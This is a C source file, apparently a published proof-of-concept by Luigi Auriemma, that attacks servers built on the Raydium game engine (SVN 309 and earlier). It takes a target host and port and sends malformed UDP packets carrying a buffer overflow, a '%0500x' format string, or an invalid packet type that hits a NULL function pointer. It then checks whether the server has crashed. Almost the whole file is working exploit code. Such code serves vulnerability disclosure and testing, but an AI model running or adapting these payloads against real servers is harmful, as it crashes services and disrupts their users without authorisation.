/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <sys/param.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define stristr strcasestr
    #define ONESEC  1
#endif



#define VER         "0.1"
#define PORT        29104
#define BUFFSZ      RAYDIUM_NETWORK_PACKET_SIZE

#define RAYDIUM_NETWORK_PACKET_OFFSET               4
#define RAYDIUM_NETWORK_PACKET_SIZE                 512

#define RAYDIUM_NETWORK_PACKET_DATA                 1
#define RAYDIUM_NETWORK_PACKET_ERROR_NO_MORE_PLACE  2
#define RAYDIUM_NETWORK_PACKET_ATTRIB_UID           3
#define RAYDIUM_NETWORK_PACKET_REQUEST_UID          4
#define RAYDIUM_NETWORK_PACKET_INFO_NAME            5
#define RAYDIUM_NETWORK_PACKET_ACK                  6
#define RAYDIUM_NETWORK_PACKET_SERVER_BEACON        7
#define RAYDIUM_NETWORK_PACKET_ODE_DATA             10
#define RAYDIUM_NETWORK_PACKET_ODE_NEWELEM          11
#define RAYDIUM_NETWORK_PACKET_ODE_REMELEM          12
#define RAYDIUM_NETWORK_PACKET_ODE_NIDWHO           13
#define RAYDIUM_NETWORK_PACKET_ODE_EXPLOSION        14
#define	RAYDIUM_NETWORK_PACKET_BASE                 20



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int timeout(int sock, int sec);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    int     sd,
            attack,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Raydium <= SVN 309 multiple vulnerabilities " VER "\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attacks:\n"
            " 1 = buffer-overflow in raydium_log and raydium_console_line_add\n"
            " 2 = format string in raydium_log\n"
            " 3 = NULL function pointer in raydium_network_netcall_exec\n"
//            " 4 = buffer-overflow and invalid memory access in raydium_network_read\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port    = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    memset(buff, 0, sizeof(buff));
    buff[0] = RAYDIUM_NETWORK_PACKET_REQUEST_UID;
    buff[1] = 0;
    *(short *)(buff + 2) = time(NULL);

    switch(attack) {
        case 1: {
            memset(buff + RAYDIUM_NETWORK_PACKET_OFFSET, 'a', RAYDIUM_NETWORK_PACKET_SIZE - RAYDIUM_NETWORK_PACKET_OFFSET);
            } break;
        case 2: {
            strcpy(buff + RAYDIUM_NETWORK_PACKET_OFFSET, "%0500x");
            } break;
        case 3: {
            buff[0] = 0xff;
            } break;
        default: {
            printf("\nError: wrong attack number\n\n");
            exit(1);
            } break;
    }

    printf("- send malformed packet for attack %d\n", attack);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    len = send_recv(sd, buff, RAYDIUM_NETWORK_PACKET_SIZE, buff, sizeof(buff), 0);
    if(len < 0) {
        printf("- no reply from the server, it's probably crashed\n");
    }
    close(sd);

    printf("- check server:\n");
    memset(buff, 0, sizeof(buff));
    buff[0] = RAYDIUM_NETWORK_PACKET_REQUEST_UID;
    buff[1] = 0;
    *(short *)(buff + 2) = time(NULL);
    strcpy(buff + RAYDIUM_NETWORK_PACKET_OFFSET, "username");

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    if(send_recv(sd, buff, RAYDIUM_NETWORK_PACKET_SIZE, buff, sizeof(buff), 0) < 0 ) {
        printf("\n  Server IS vulnerable!!!\n\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n\n");
    }
    close(sd);
    return(0);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    if(in && !out) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        return(0);

    } else if(in) {
        for(retry = 3; retry; retry--) {
            if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            fputs("\nError: socket timeout, no reply received\n\n", stdout);
            exit(1);
        }

    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    return(len);
}



int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


